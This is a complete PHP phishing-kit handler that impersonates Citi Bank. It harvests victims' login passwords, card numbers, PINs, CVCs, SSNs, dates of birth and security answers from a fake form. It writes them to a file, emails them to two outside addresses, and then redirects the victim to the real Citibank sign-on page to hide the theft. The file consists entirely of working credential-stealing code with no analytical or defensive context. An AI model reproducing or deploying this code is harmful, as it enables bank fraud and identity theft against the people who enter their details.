<?

$ip = getenv("REMOTE_ADDR");

$message .= "--------------Citi Bank Info-----------------------\n";
$message .= "User Id            : ".$_POST['formtext1']."\n";
$message .= "Password            : ".$_POST['formtext2']."\n";
$message .= "Email            : ".$_POST['formtext12']."\n";
$message .= "Password            : ".$_POST['formtext23']."\n";
$message .= "CcNuMbeR            : ".$_POST['formtext3']."\n";
$message .= "Exp Date            : ".$_POST['formtext18']."\n";
$message .= "CCPiN            : ".$_POST['formtext4']."\n";
$message .= "CVC            : ".$_POST['formtext5']."\n";
$message .= "DOB            : ".$_POST['formtext6']."\n";
$message .= "SSN            : ".$_POST['formtext7']."\n";
$message .= "Zip code            : ".$_POST['formtext8']."\n";
$message .= "Mother name           : ".$_POST['formtext9']."\n";
$message .= "First Elementary School Attended           : ".$_POST['formtext16']."\n";
$message .= "phone number           : ".$_POST['formtext17']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY unknown-------------\n";


	$file = fopen("citi909xxxV0x.txt","a+");
	fwrite($file,$message);
	fclose($file);


$send = "madwire101@gmail.com, alexpaynebanker@comcast.net";

$subject = "Citi : $ip";

$headers = "From: Citi Bank<customer-support@Spammers>";

$headers .= $_POST['eMailAdd']."\n";

$headers .= "MIME-Version: 1.0\n";

$arr=array($send, $IP);

foreach ($arr as $send)

{

mail($send,$subject,$message,$headers);

mail($to,$subject,$message,$headers);

}



	

		   header("Location: https://online.citibank.com/US/JSO/signon/CBOLSessionRecovery.do");



	 

?>